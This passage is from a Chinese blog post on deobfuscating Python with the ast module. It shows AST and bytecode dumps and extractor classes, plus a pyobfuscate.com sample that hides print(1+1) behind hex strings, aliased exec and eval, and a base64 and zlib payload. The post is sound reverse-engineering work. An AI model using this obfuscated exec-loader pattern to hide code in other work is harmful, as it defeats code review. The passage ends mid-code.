<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>UPONのblog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="UPONのblog"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="UPONのblog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="UPON-2021の屋子"><meta property="og:url" content="https://upon-2021.github.io/"><meta property="og:site_name" content="UPON-2021の屋子"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://upon-2021.github.io/img/avatar.png"><meta property="article:author" content="UPON-2021"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"xn--upon-eu0gs25bb4r113aow1c.googles.icu"},"headline":"UPONのblog","image":["/img/og_image.png"],"author":{"@type":"Person","name":"UPON2021"},"description":""}</script><link rel="icon" href="/img/favicon.png"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.0.2"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="UPONのblog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friend">友链</a><a class="navbar-item" href="/message">留言</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card widget">
            <div class="card-content">
                <h3 class="menu-label">热门推荐</h3><span id="index_hot_div">加载中，请稍等...</span>
            </div>
        </div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2023-06-17  <a class="commentCountImg" href="/2023/06/17/%E4%B8%80%E7%A7%8D%E5%9F%BA%E4%BA%8East%E7%9A%84python%E5%8F%8D%E6%B7%B7%E6%B7%86%E6%80%9D%E8%B7%AF/#comment-container"><span class="display-none-class">3fa64ebf17e214bb08f85781e6760472</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="3fa64ebf17e214bb08f85781e6760472">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>25 分钟  <i class="fas fa-pencil-alt"> </i>3.8 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/06/17/%E4%B8%80%E7%A7%8D%E5%9F%BA%E4%BA%8East%E7%9A%84python%E5%8F%8D%E6%B7%B7%E6%B7%86%E6%80%9D%E8%B7%AF/">一次基于ast的python反混淆尝试</a></h1><div class="content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前看到一个python混淆的网站，感觉很不错，就拿过来研究了一下，当时霸王硬上弓(指扔给idea美化代码之后然后插print)硬是给撅出来了</p>
<p><img src="/images/obfuscate/2.png"><br><img src="/images/obfuscate/3.png"></p>
<p>当时硬print的时候就在想，能否以python解释器的方法来处理分析这些内容，然后就接触到一个东西”AST”。</p>
<p>最近刚好看到他们家换了新的混淆方法，就拿过来好好研究怎么用AST分析了。<br><img src="/images/obfuscate/1.png"></p>
<h1 id="0x01-前置内容"><a href="#0x01-前置内容" class="headerlink" title="0x01 前置内容"></a>0x01 前置内容</h1><h3 id="Python-源码编译过程"><a href="#Python-源码编译过程" class="headerlink" title="Python 源码编译过程"></a>Python 源码编译过程</h3><p>Python 源码到机器码的过程，以 CPython 为例，编译过程如下：</p>
<pre><code>将源代码解析为解析树（Parser Tree）
将解析树转换为抽象语法树（Abstract Syntax Tree）
将抽象语法树转换到控制流图（Control Flow Graph）
根据流图将字节码（bytecode）发送给虚拟机（ceval）
</code></pre>
<p>可以使用以下模块进行操作：</p>
<pre><code>ast 模块可以控制抽象语法树的生成和编译
py-compile 模块能够将源码换成字节码（编译），保存在 __pycache__ 文件夹，以 .pyc 结尾（不可读）
dis 模块通过反汇编支持对字节码的分析（可读）
</code></pre>
<h3 id="一些简单代码的ast分析"><a href="#一些简单代码的ast分析" class="headerlink" title="一些简单代码的ast分析"></a>一些简单代码的ast分析</h3><p>这里先上一些简单的例子，为后面的分析铺垫。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import requests</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def req_baidu():</span></span><br><span class="line"><span class="string">    r = requests.get(&#x27;https://www.baidu.com/&#x27;)</span></span><br><span class="line"><span class="string">    print(r.text)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">req_baidu()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code_ast = ast.parse(code)</span><br><span class="line">code_compile = <span class="built_in">compile</span>(code_ast, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ast.dump(code_ast,indent=<span class="number">4</span>))</span><br><span class="line">dis.dis(code_compile)</span><br></pre></td></tr></table></figure>
<p>得到的输出是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">python .\test.py</span><br><span class="line">Module(</span><br><span class="line">    body=[</span><br><span class="line">        Import(</span><br><span class="line">            names=[</span><br><span class="line">                alias(name=&#x27;requests&#x27;)]),</span><br><span class="line">        FunctionDef(</span><br><span class="line">            name=&#x27;req_baidu&#x27;,</span><br><span class="line">            args=arguments(</span><br><span class="line">                posonlyargs=[],</span><br><span class="line">                args=[],</span><br><span class="line">                kwonlyargs=[],</span><br><span class="line">                kw_defaults=[],</span><br><span class="line">                defaults=[]),</span><br><span class="line">            body=[</span><br><span class="line">                Assign(</span><br><span class="line">                    targets=[</span><br><span class="line">                        Name(id=&#x27;r&#x27;, ctx=Store())],</span><br><span class="line">                    value=Call(</span><br><span class="line">                        func=Attribute(</span><br><span class="line">                            value=Name(id=&#x27;requests&#x27;, ctx=Load()),</span><br><span class="line">                            attr=&#x27;get&#x27;,</span><br><span class="line">                            ctx=Load()),</span><br><span class="line">                        args=[</span><br><span class="line">                            Constant(value=&#x27;https://www.baidu.com/&#x27;)],</span><br><span class="line">                        keywords=[])),</span><br><span class="line">                Expr(</span><br><span class="line">                    value=Call(</span><br><span class="line">                        func=Name(id=&#x27;print&#x27;, ctx=Load()),</span><br><span class="line">                        args=[</span><br><span class="line">                            Attribute(</span><br><span class="line">                                value=Name(id=&#x27;r&#x27;, ctx=Load()),</span><br><span class="line">                                attr=&#x27;text&#x27;,</span><br><span class="line">                                ctx=Load())],</span><br><span class="line">                        keywords=[]))],</span><br><span class="line">            decorator_list=[]),</span><br><span class="line">        Expr(</span><br><span class="line">            value=Call(</span><br><span class="line">                func=Name(id=&#x27;req_baidu&#x27;, ctx=Load()),</span><br><span class="line">                args=[],</span><br><span class="line">                keywords=[]))],</span><br><span class="line">    type_ignores=[])</span><br><span class="line"></span><br><span class="line">  2           0 LOAD_CONST               0 (0)</span><br><span class="line">              2 LOAD_CONST               1 (None)</span><br><span class="line">              4 IMPORT_NAME              0 (requests)</span><br><span class="line">              6 STORE_NAME               0 (requests)</span><br><span class="line"></span><br><span class="line">  4           8 LOAD_CONST               2 (&lt;code object req_baidu at 0x000002245F825D10, file &quot;&lt;string&gt;&quot;, line 4&gt;)</span><br><span class="line">             10 LOAD_CONST               3 (&#x27;req_baidu&#x27;)</span><br><span class="line">             12 MAKE_FUNCTION            0</span><br><span class="line">             14 STORE_NAME               1 (req_baidu)</span><br><span class="line"></span><br><span class="line">  8          16 LOAD_NAME                1 (req_baidu)</span><br><span class="line">             18 CALL_FUNCTION            0</span><br><span class="line">             20 POP_TOP</span><br><span class="line">             22 LOAD_CONST               1 (None)</span><br><span class="line">             24 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object req_baidu at 0x000002245F825D10, file &quot;&lt;string&gt;&quot;, line 4&gt;:</span><br><span class="line">  5           0 LOAD_GLOBAL              0 (requests)</span><br><span class="line">              2 LOAD_METHOD              1 (get)</span><br><span class="line">              4 LOAD_CONST               1 (&#x27;https://www.baidu.com/&#x27;)</span><br><span class="line">              6 CALL_METHOD              1</span><br><span class="line">              8 STORE_FAST               0 (r)</span><br><span class="line"></span><br><span class="line">  6          10 LOAD_GLOBAL              2 (print)</span><br><span class="line">             12 LOAD_FAST                0 (r)</span><br><span class="line">             14 LOAD_ATTR                3 (text)</span><br><span class="line">             16 CALL_FUNCTION            1</span><br><span class="line">             18 POP_TOP</span><br><span class="line">             20 LOAD_CONST               0 (None)</span><br><span class="line">             22 RETURN_VALUE</span><br></pre></td></tr></table></figure>
<p>大致看一看，不难发现，ast处理后的python其实已经和bytecode都差不多了，相对应的位置都一样，只不过可读性比字节码好上了不少，看起来还特别的直观。</p>
<h3 id="Python-ast的抽象文法"><a href="#Python-ast的抽象文法" class="headerlink" title="Python ast的抽象文法:"></a>Python ast的抽象文法:</h3><p>这里就摘了一部分，是这次反混淆需要用到的<br><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/ast.html#module-ast">Abstract Grammar</a></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>mod</td>
<td>Module<br>Interactive<br>Expression<br>FunctionType</td>
</tr>
<tr>
<td>stmt</td>
<td>FunctionDef&lt;brReturn<br>Deleate<br>Assign<br>…</td>
</tr>
<tr>
<td>expr</td>
<td>BllOp<br>NamedExpr<br>Lambda<br>…</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
</tbody></table>
<p>在我们一个python代码里，出现的主要还是 stmt 里的内容，定义函数<code>FunctionDef</code>，赋值<code>Assign</code>，在这些stmt里面是各种expr</p>
<p>结合上面的语句大致对照一下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Import(names=[alias(name=&#x27;requests&#x27;)]),                             --&gt;    import requests</span><br><span class="line">FunctionDef(                                                        </span><br><span class="line">    name=&#x27;req_baidu&#x27;,                                               --&gt;    def req_baidu()</span><br><span class="line">    args=arguments(</span><br><span class="line">        posonlyargs=[],</span><br><span class="line">        args=[],</span><br><span class="line">        kwonlyargs=[],</span><br><span class="line">        kw_defaults=[],</span><br><span class="line">        defaults=[]),                                                          </span><br><span class="line">    body=[                                                          --&gt;</span><br><span class="line">        Assign(</span><br><span class="line">            targets=[                                               --&gt;r = requests.get(&#x27;https://www.baidu.com/&#x27;)</span><br><span class="line">                Name(id=&#x27;r&#x27;, ctx=Store())],</span><br><span class="line">            value=Call(</span><br><span class="line">                func=Attribute(</span><br><span class="line">                    value=Name(id=&#x27;requests&#x27;, ctx=Load()),</span><br><span class="line">                    attr=&#x27;get&#x27;,</span><br><span class="line">                    ctx=Load()),</span><br><span class="line">                args=[</span><br><span class="line">                    Constant(value=&#x27;https://www.baidu.com/&#x27;)],</span><br><span class="line">                keywords=[])),</span><br><span class="line">        Expr(                                                       --&gt; print(r.text)</span><br><span class="line">            value=Call(</span><br><span class="line">                func=Name(id=&#x27;print&#x27;, ctx=Load()),</span><br><span class="line">                args=[</span><br><span class="line">                    Attribute(</span><br><span class="line">                        value=Name(id=&#x27;r&#x27;, ctx=Load()),</span><br><span class="line">                        attr=&#x27;text&#x27;,</span><br><span class="line">                        ctx=Load())],</span><br><span class="line">                keywords=[]))],</span><br><span class="line">    decorator_list=[]),</span><br></pre></td></tr></table></figure>

<h1 id="0x02-开淦"><a href="#0x02-开淦" class="headerlink" title="0x02 开淦"></a>0x02 开淦</h1><p>这是一个<code>print(1+1)</code></p>
<p><img src="/images/obfuscate/5.png"><br>被加密&amp;混淆后的结果</p>
<p>这里先剧透一下，上面的<code>obfuscate</code>在第一层用不上，这里就先看前面的加密部分。</p>
<p>大致扫了一眼，整个代码里面，全是变量定义外加<code>lambda</code>，最后执行的表达式(expr)也被混在了这一行里面，这里仿照<code>ast.py</code>中注释给出的代码样例，搓出<code>Assign</code>和<code>Expr</code>的抽象文法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AssignExtractor</span>(ast.NodeVisitor):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.assign_nodes = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_Assign</span>(<span class="params">self, node</span>):</span><br><span class="line">        self.assign_nodes.append(node)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExprExtractor</span>(ast.NodeVisitor):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.expr_nodes = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_Expr</span>(<span class="params">self, node</span>):</span><br><span class="line">        self.expr_nodes.append(node)</span><br></pre></td></tr></table></figure>
<h3 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析:"></a>开始分析:</h3><p>先来一个<code>print(1+1)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pip install pycryptodome  , It works only v3.11 Above.</span></span><br><span class="line"><span class="keyword">import</span> random ,base64,codecs,zlib;pyobfuscate=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">obfuscate = <span class="built_in">dict</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> <span class="built_in">map</span>,<span class="built_in">dict</span>:(<span class="built_in">map</span>,<span class="built_in">dict</span>),[<span class="string">&#x27;(https://pyobfuscate.com)*(decrypt)&#x27;</span>],[<span class="string">&#x27;&#x27;&#x27;Mg9q#UDn(oW~!Zy`F!j-yD|&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)]))</span><br><span class="line"></span><br><span class="line">_=<span class="keyword">lambda</span> OO00000OOO0000OOO,c_int=<span class="number">100000</span>:(_OOOO00OO0O00O00OO:=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">int</span>(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(<span class="number">1</span>,c_int)))<span class="keyword">for</span> OO00O0OO00O0O0OO0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(OO00000OOO0000OOO.split()))));<span class="built_in">eval</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">99</span>]))(<span class="string">&quot;\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29&quot;</span>);__=<span class="string">&#x27;600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890&#x27;</span>;why,are,you,reading,this,thing,huh=<span class="string">&quot;\x5f\x5f\x5f\x5f&quot;</span>,<span class="string">&quot;\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f&quot;</span>,<span class="string">&quot;\x28\x22\x22\x2e\x6a\x6f&quot;</span>,<span class="string">&quot;\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c&quot;</span>,<span class="string">&quot;\x31\x30\x31\x2c\x39\x39&quot;</span>,<span class="string">&quot;\x5f\x5f\x29\x29&quot;</span>,<span class="string">&quot;\x5d\x29\x29\x28\x5f\x28&quot;</span>;b=<span class="string">&#x27;eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=&#x27;</span>;____(<span class="string">&quot;&quot;</span>.join (<span class="built_in">chr</span> (<span class="built_in">int</span> (OO00O0OO00O0O0OO00 /<span class="number">2</span> ))<span class="keyword">for</span> OO00O0OO00O0O0OO00 <span class="keyword">in</span> [<span class="number">202</span> ,<span class="number">240</span> ,<span class="number">202</span> ,<span class="number">198</span> ] <span class="keyword">if</span> _____!=______))(<span class="string">f&#x27;\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29(<span class="subst">&#123;____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(<span class="string">b&quot;eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=&quot;</span>)).decode(),<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(i/<span class="number">8</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">912</span>, <span class="number">888</span>, <span class="number">928</span>, <span class="number">392</span>, <span class="number">408</span>])).encode()))&#125;</span>)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>乍一看，用了大量的lambda把代码写成了一行，想提取里面的代码很难，我第一次破的时候是直接扔到pycharm里面格式化到处插<code>print</code>看变量的值，为了对准<code>lambda</code>表达式后面的<code>;</code>挺痛苦的，上AST看一下。</p>
<p>因为里面的代码主要是赋值(Assign)语句，最后执行的代码(Expr)跟在了<code>lambda</code>的分号后面了，先大致拉出来看看:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> extractors <span class="keyword">import</span> AssignExtractor,ExprExtractor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span 